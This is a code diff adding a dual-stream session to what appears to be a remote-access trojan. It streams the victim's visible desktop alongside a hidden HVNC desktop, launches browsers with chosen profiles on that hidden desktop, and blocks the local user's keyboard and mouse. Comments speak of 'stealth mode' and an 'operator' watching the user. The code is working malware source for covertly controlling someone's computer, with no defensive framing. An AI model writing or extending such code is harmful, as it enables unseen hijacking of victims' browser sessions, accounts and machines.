@@ -475,3 +475,321 @@ def create_hvnc_session_wrapper(
         fps=fps,
         start_shell=start_shell,
     )
+
+
+class MainDesktopTrack(MediaStreamTrack):
+    """Video track for the main (visible) desktop.
+    
+    Used in dual-stream mode to capture the real desktop
+    that the user can see.
+    """
+    
+    kind = "video"
+    
+    def __init__(self, profile: str = "balanced"):
+        """Initialize main desktop track.
+        
+        Args:
+            profile: Stream quality profile
+        """
+        super().__init__()
+        self._id = "main_desktop"
+        self._label = "Main Desktop"
+        self._profile_name = profile
+        self._profile = None
+        self._sct = None
+        self._monitor = None
+        self._native_size = (1920, 1080)
+        self._target_size = self._native_size
+        self._target_fps = 30
+        self._start_time: float | None = None
+        self._timestamp = 0
+        self._last_frame: VideoFrame | None = None
+        self._last_frame_ts: float | None = None
+        
+        self._init_capture()
+        
+        if AdaptiveStreamProfile is not None:
+            try:
+                self._profile = AdaptiveStreamProfile(self._native_size, profile)
+            except Exception as e:
+                logger.warning("Failed to init profile %s: %s", profile, e)
+        
+        logger.info("MainDesktopTrack initialized with profile: %s", profile)
+    
+    def _init_capture(self) -> None:
+        """Initialize screen capture."""
+        try:
+            import mss
+        except Exception as exc:
+            logger.warning("mss unavailable: %s", exc)
+            return
+        try:
+            self._sct = mss.mss()
+            monitors = self._sct.monitors
+            if not monitors:
+                return
+            # Use primary monitor (index 1, or 0 if only one)
+            index = 1 if len(monitors) > 1 else 0
+            self._monitor = monitors[index]
+            self._native_size = (
+                int(self._monitor["width"]),
+                int(self._monitor["height"]),
+            )
+        except Exception as exc:
+            logger.warning("Screen capture init failed: %s", exc)
+            self._sct = None
+            self._monitor = None
+    
+    @property
+    def id(self) -> str:
+        return self._id
+    
+    @property
+    def label(self) -> str:
+        return self._label
+    
+    def set_profile(
+        self,
+        name: str | None = None,
+        width: int | None = None,
+        height: int | None = None,
+        fps: int | None = None,
+    ) -> None:
+        """Update stream profile settings."""
+        if name and self._profile is not None:
+            try:
+                self._profile.apply_profile(name, width, height, fps)
+                self._profile_name = name
+                self._target_size = self._profile.target_size
+                self._target_fps = self._profile.target_fps
+            except Exception as e:
+                logger.warning("Failed to set profile %s: %s", name, e)
+    
+    async def _next_timestamp(self) -> tuple[int, Fraction]:
+        """Get the next timestamp for a frame."""
+        import time
+        if self._start_time is None:
+            self._start_time = time.time()
+        
+        now = time.time()
+        elapsed = now - self._start_time
+        pts = int(elapsed * VIDEO_CLOCK_RATE)
+        
+        return pts, VIDEO_TIME_BASE
+    
+    def _capture_frame(self) -> tuple[bytes | None, tuple[int, int]]:
+        """Capture frame from main desktop."""
+        if self._sct and self._monitor:
+            try:
+                shot = self._sct.grab(self._monitor)
+                return shot.raw, (shot.width, shot.height)
+            except Exception as exc:
+                logger.debug("Screen grab failed: %s", exc)
+        return None, self._target_size
+    
+    async def recv(self) -> VideoFrame:
+        """Receive the next video frame."""
+        import time
+        pts, time_base = await self._next_timestamp()
+        
+        frame_data, frame_size = self._capture_frame()
+        width, height = frame_size
+        
+        if frame_data is None:
+            # Return last frame or black frame
+            if self._last_frame is not None:
+                frame = self._last_frame
+                frame.pts = pts
+                frame.time_base = time_base
+                return frame
+            else:
+                frame_data = bytes(width * height * 4)
+        
+        try:
+            frame = VideoFrame(width=width, height=height, format="bgra")
+            frame.planes[0].update(frame_data)
+            frame.pts = pts
+            frame.time_base = time_base
+            
+            # Resize if needed
+            if self._target_size and (frame.width, frame.height) != self._target_size:
+                frame = frame.reformat(
+                    width=self._target_size[0],
+                    height=self._target_size[1],
+                )
+            
+            self._last_frame = frame
+            return frame
+        except Exception as e:
+            logger.error("Failed to create video frame: %s", e)
+            from aiortc.mediastreams import MediaStreamError
+            raise MediaStreamError("Failed to create video frame")
+    
+    def stop(self) -> None:
+        """Stop the track."""
+        if self._sct:
+            try:
+                self._sct.close()
+            except Exception:
+                pass
+            self._sct = None
+        super().stop()
+        logger.info("MainDesktopTrack stopped")
+
+
+class DualStreamSession:
+    """Session that provides dual video streams: main desktop + HVNC.
+    
+    This session creates two video tracks:
+    1. Main desktop track - captures the real desktop visible to the user
+    2. HVNC track - captures the hidden desktop created via CreateDesktop API
+    
+    Both streams are available simultaneously, allowing the operator to see
+    both what the user sees and what's happening on the hidden desktop.
+    """
+    
+    def __init__(
+        self,
+        width: int = 1920,
+        height: int = 1080,
+        fps: int = 30,
+        start_shell: bool = False,  # Default false for stealth mode
+    ):
+        """Create dual-stream session.
+        
+        Args:
+            width: Screen width for HVNC desktop
+            height: Screen height for HVNC desktop
+            fps: Target framerate
+            start_shell: Whether to start explorer on HVNC desktop
+        """
+        if not HVNC_AVAILABLE:
+            raise RuntimeError("hVNC not available on this platform")
+        
+        # Create HVNC session
+        self._hvnc_session = create_hvnc_session(
+            width=width,
+            height=height,
+            fps=fps,
+            start_shell=start_shell,
+        )
+        
+        # Create main desktop track
+        self.main_desktop_track = MainDesktopTrack(profile="balanced")
+        
+        # Create HVNC track (reuse existing implementation)
+        self.hvnc_track = HVNCVideoTrack(self._hvnc_session, profile="balanced")
+        # Set distinct id/label for HVNC track
+        self.hvnc_track._id = "hvnc_desktop"
+        self.hvnc_track._label = "HVNC Desktop"
+        
+        # screen_track for compatibility - returns HVNC track
+        # (input goes to HVNC desktop, so that's the primary interaction target)
+        self.screen_track = self.hvnc_track
+        
+        # Dual tracks list for WebRTC
+        self.video_tracks = [self.main_desktop_track, self.hvnc_track]
+        
+        # Input controller points to HVNC session
+        self.input_controller = HVNCInputController(self._hvnc_session)
+        
+        self._input_blocked = False
+        
+        # Register session with HVNCActions
+        try:
+            from .hvnc_actions import get_hvnc_actions
+            get_hvnc_actions().set_session(self._hvnc_session)
+            logger.info("HVNCActions linked to dual-stream session")
+        except Exception as e:
+            logger.warning("Failed to link HVNCActions: %s", e)
+        
+        logger.info("DualStreamSession initialized with 2 video tracks")
+    
+    @property
+    def mode(self) -> str:
+        """Get session mode."""
+        return "hvnc_dual"
+    
+    @property
+    def is_virtual_display_active(self) -> bool:
+        """HVNC uses hidden desktop, not virtual display."""
+        return False
+    
+    def launch_application(self, app_name: str, url: str | None = None, profile_path: str | None = None) -> None:
+        """Launch an application on the HVNC hidden desktop.
+        
+        Args:
+            app_name: Application name (chrome, firefox, edge) or path
+            url: URL to open (for browsers)
+            profile_path: Path to browser profile directory
+        """
+        app_lower = app_name.lower()
+        
+        if app_lower in ("chrome", "firefox", "edge", "chromium", "brave"):
+            self._hvnc_session.launch_browser(app_lower, url=url, profile_path=profile_path)
+        else:
+            args = [url] if url else None
+            self._hvnc_session.launch_application(app_name, args=args)
+    
+    def get_windows(self) -> list:
+        """Get list of windows on HVNC hidden desktop."""
+        return self._hvnc_session.get_windows()
+    
+    def block_local_input(self) -> bool:
+        """Block local keyboard/mouse input."""
+        try:
+            import ctypes
+            ctypes.windll.user32.BlockInput(True)
+            self._input_blocked = True
+            return True
+        except Exception:
+            return False
+    
+    def unblock_local_input(self) -> None:
+        """Unblock local input."""
+        if self._input_blocked:
+            try:
+                import ctypes
+                ctypes.windll.user32.BlockInput(False)
+                self._input_blocked = False
+            except Exception:
+                pass
+    
+    def close(self) -> None:
+        """Close the session and both tracks."""
+        self.main_desktop_track.stop()
+        self.hvnc_track.stop()
+        self.input_controller.close()
+        self.unblock_local_input()
+        self._hvnc_session.close()
+        logger.info("DualStreamSession closed")
+
+
+def create_dual_stream_session(
+    width: int = 1920,
+    height: int = 1080,
+    fps: int = 30,
+    start_shell: bool = False,
+) -> DualStreamSession:
+    """Create dual-stream session (main desktop + HVNC).
+    
+    This is a factory function that creates a session with
+    two video tracks for simultaneous viewing of the main
+    desktop and the HVNC hidden desktop.
+    
+    Args:
+        width: HVNC desktop width
+        height: HVNC desktop height
+        fps: Target framerate
+        start_shell: Whether to start explorer on HVNC desktop
+    
+    Returns:
+        DualStreamSession instance
+    """
+    return DualStreamSession(
+        width=width,
+        height=height,
+        fps=fps,
+        start_shell=start_shell,
+    )
